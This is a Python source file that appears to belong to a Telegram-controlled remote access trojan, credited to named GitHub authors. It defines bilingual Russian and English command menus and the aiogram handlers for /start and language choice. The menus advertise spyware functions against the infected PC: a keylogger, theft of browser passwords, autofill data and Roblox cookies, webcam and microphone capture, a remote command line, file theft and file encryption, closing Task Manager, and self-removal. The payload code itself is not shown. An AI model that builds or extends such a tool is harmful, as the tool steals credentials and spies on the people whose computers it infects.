##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


TEXTS = {
    'ru': {
        'start': (
            "<b>  Приветствую, root.</b>\n"

            "Я готов к работе.\n\n"

            "<b>  Основное управление:</b>\n"
            "/start — Запустить бота\n"
            "/pc_data — Получить информацию о ПК\n"
            "/network_diagnostics — Диагностика сети\n"
            "/shutdown_pc — Выключить ПК\n"
            "/restart_pc — Перезагрузить ПК\n"
            "/self_destruction — Удалить бота с устройства\n\n"

            "<b>  Безопасность и защита:</b>\n"
            "/antivirus — Проверить антивирусные программы\n"
            "/cmd_boom — Вывести ошибку CMD\n"
            "/close_task_manager — Закрыть диспетчер задач\n\n"

            "<b>  Скриншоты и запись:</b>\n"
            "/screenshot — Сделать скриншот\n"
            "/snapshot — Фото с веб-камеры\n"
            "/web_record — Видеозапись с веб-камеры\n"
            "/audio_record — Запись звука с микрофона\n"
            "/play_sound — Проиграть звук\n\n"

            "<b>  Мониторинг:</b>\n"
            "/key_logger — Запустить кейлоггер\n"
            "/key_logs — Получить лог клавиш\n"
            "/clipboard_content — Буфер обмена\n"
            "/chrome_history — История Chrome\n"
            "/opera_history — История Opera\n"
            "/autofill — Автозаполнения браузера\n"
            "/passwords — Пароли браузера\n"
            "/robloxcookie — Получить Roblox cookie\n"
            "/processes — Активные процессы\n"
            "/fullprocesses — Все процессы\n"
            "/terminate_process — Завершить процесс\n"
            "/cmd — Командная строка\n\n"

            "<b>  Файлы и директории:</b>\n"
            "/send_file — Получить файл\n"
            "/upload_file — Загрузить файл\n"
            "/delete_file — Удалить файл\n"
            "/move_file — Переместить файл\n"
            "/create_folder — Создать папку\n"
            "/delete_folder — Удалить папку\n"
            "/show_directory_content — Список файлов\n"
            "/change_directory — Сменить директорию\n\n"

            "<b>  Удалённые действия:</b>\n"
            "/open_url — Открыть ссылку в браузере\n"
            "/alt_f4 — Закрыть активное окно\n"
            "/minimize_all_windows — Свернуть все окна\n"
            "/change_wallpaper — Сменить обои рабочего стола\n\n"

            "<b>  Управление звуком:</b>\n"
            "/mute_sound — Выключить звук\n"
            "/unmute_sound — Включить звук\n"
            "/set_volume_100 — Установить громкость 100%\n\n"

            "<b>  Шифрование:</b>\n"
            "/encrypt_file — Зашифровать файл\n"
            "/decipher_file — Расшифровать файл"
        ),

        'ready': "Готов к использованию",
        'choose_language': "Выберите язык / Choose language:",
        'language_buttons': ["Русский 🇷🇺", "English 🇬🇧"],
        'language_selected': "Язык установлен на русский 🇷🇺",
        'buttons': [
            ["Смена языка"],
            ["Антивирус", "Скриншот"],
            ["Процесы", "Фото с камеры"],
            ["Полный отчет по процесам", "Завершить процесс"],
            ["Создать папку", "Удалить папку"],
            ["Содержание директории", "Переместиться по директории"],
            ["Данные ПК", "Диагностика сети"],
            ["Запись с веб камеры", "Запись аудио"],
            ["Открыть файл", "Загрузить файл"],
            ["Скачать файл", "Удалить файл"],
            ["Зашифровать файл", "Расшифровать файл"],
            ["История хрома", "История оперы"],
            ["Автозаполнения браузера", "Пароли браузера"],
            ["Роблокс куки", "Командная строка"],
            ["Автозаполнения браузера"],
            ["ALT + F4", "Свернуть все окна"],
            ["Посмотреть буфер обмена", "Изменить буфер обмена"],
            ["Закрыть диспетчер задач", "Открыть ссылку"],
            ["Включить звук", "Выключить звук"],
            ["Звук на 100%", "CMD бомба"],
            ["Выключить ПК", "Перезагрузить ПК"],
            ["Перемистить файл", "Поменять обои"],
            ["key logger", "key logs"],
            ["Воспроизвести звук", "Самоуничтожение"]
        ]
    },
    'en': {
        'start': (
            "<b>  Welcome, root.</b>\n"
            "I'm ready to work.\n\n"

            "<b>  Available commands:</b>\n\n"
            
            "<b>  Basic control:</b>\n"
            "/start — Start the bot\n"
            "/pc_data — Get PC info\n"
            "/network_diagnostics — Network diagnostics\n"
            "/shutdown_pc — Shut down PC\n"
            "/restart_pc — Restart PC\n"
            "/self_destruction — Remove the bot from the device\n\n"
            
            "<b>  Security:</b>\n"
            "/antivirus — Check antivirus\n"
            "/cmd_boom — Show CMD error\n"
            "/close_task_manager — Close Task Manager\n"
            " Screenshots and Recording:\n"
            "/screenshot — Take screenshot\n"
            "/snapshot — Webcam photo\n"
            "/web_record — Webcam video\n"
            "/audio_record — Microphone audio\n"
            "/play_sound — Play a sound\n\n"

            "<b>  Monitoring:</b>\n"
            "/key_logger — Start keylogger\n"
            "/key_logs — Get key logs\n"
            "/clipboard_content — Clipboard content\n"
            "/chrome_history — Chrome history\n"
            "/opera_history — Opera history\n"
            "/autofill — Browser autofills\n"
            "/passwords — Browser passwords\n"
            "/robloxcookie — Get Roblox cookie\n"
            "/processes — Active processes\n"
            "/fullprocesses — All processes\n"
            "/terminate_process — Kill process\n"
            "/autofill — Browser autofill\n"
            "/cmd — Command line\n\n"

            "<b>  Files:</b>\n"
            "/send_file — Get file\n"
            "/upload_file — Upload file\n"
            "/delete_file — Delete file\n"
            "/move_file — Move file\n"
            "/create_folder — Create folder\n"
            "/delete_folder — Delete folder\n"
            "/show_directory_content — Directory content\n"
            "/change_directory — Change directory\n\n"

            "<b>  Remote Actions:</b>\n"
            "/open_url — Open URL\n"
            "/alt_f4 — Close active window\n"
            "/minimize_all_windows — Minimize all windows\n"
            "/change_wallpaper — Change wallpaper\n\n"

            "<b>  Sound:</b>\n"
            "/mute_sound — Mute\n"  
            "/unmute_sound — Unmute\n"
            "/set_volume_100 — Set volume to 100%\n\n"

            "<b>  Encryption:</b>\n"
            "/encrypt_file — Encrypt file\n"
            "/decipher_file — Decrypt file\n"
        ),
        'ready': "Ready to use",
        'choose_language': "Choose language / Выберите язык:",
        'language_buttons': ["Русский 🇷🇺", "English 🇬🇧"],
        'language_selected': "Language set to English 🇬🇧",
        'buttons': [
            ["Change language"],
            ["Antivirus", "Screenshot"],
            ["Processes", "Webcam Photo"],
            ["Full process report", "Terminate process"],
            ["Create folder", "Delete folder"],
            ["Directory content", "Change directory"],
            ["PC Info", "Network diagnostics"],
            ["Webcam record", "Audio record"],
            ["Open file", "Upload file"],
            ["Download file", "Delete file"],
            ["Encrypt file", "Decrypt file"],
            ["Chrome history", "Opera history"],
            ["Browser autofill", "Browser passwords"],
            ["Roblox cookie", "Cmd"],
            ["Autofill"],
            ["ALT + F4", "Minimize all windows"],
            ["View clipboard", "Change clipboard"],
            ["Close task manager", "Open URL"],
            ["Unmute sound", "Mute sound"],
            ["Volume 100%", "CMD bomb"],
            ["Shutdown PC", "Reboot PC"],
            ["Move file", "Change wallpaper"],
            ["Key logger", "Key logs"],
            ["Play sound", "Self-destruction"]
        ]
    }
}

from config import bot, dp
import os
import logging
import sys
import asyncio
from aiogram import types
from aiogram.filters import Command
from aiogram import F
from lib.text.texts import user_languages


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id

    if user_id not in user_languages:
        # Default to English if not set
        user_languages[user_id] = 'en'  

    lang = user_languages[user_id]
    text = TEXTS[lang]['start']
    await message.answer(text, parse_mode="HTML")

    buttons = [[types.KeyboardButton(text=btn) for btn in row] for row in TEXTS[lang]['buttons']]
    keyboard = types.ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
    await message.answer(TEXTS[lang]['ready'], reply_markup=keyboard)



@dp.message(Command("language"))
async def cmd_language(message: types.Message):
    lang_buttons = [
        [types.KeyboardButton(text=TEXTS['ru']['language_buttons'][0]),
         types.KeyboardButton(text=TEXTS['ru']['language_buttons'][1])]
    ]
    keyboard = types.ReplyKeyboardMarkup(keyboard=lang_buttons, resize_keyboard=True)
    await message.answer(TEXTS['ru']['choose_language'], reply_markup=keyboard)



@dp.message(F.text.in_({"Русский 🇷🇺", "English 🇬🇧"}))
async def handle_language_choice(message: types.Message):
    user_id = message.from_user.id
    if message.text == "Русский 🇷🇺":
        user_languages[user_id] = 'ru'
        await message.answer(TEXTS['ru']['language_selected'])
    elif message.text == "English 🇬🇧":
        user_languages[user_id] = 'en'
        await message.answer(TEXTS['en']['language_selected'])

    await cmd_start(message)



@dp.message(F.text.in_({"Смена языка", "Change language"}))
async def handle_language_button(message: types.Message):
    await cmd_language(message)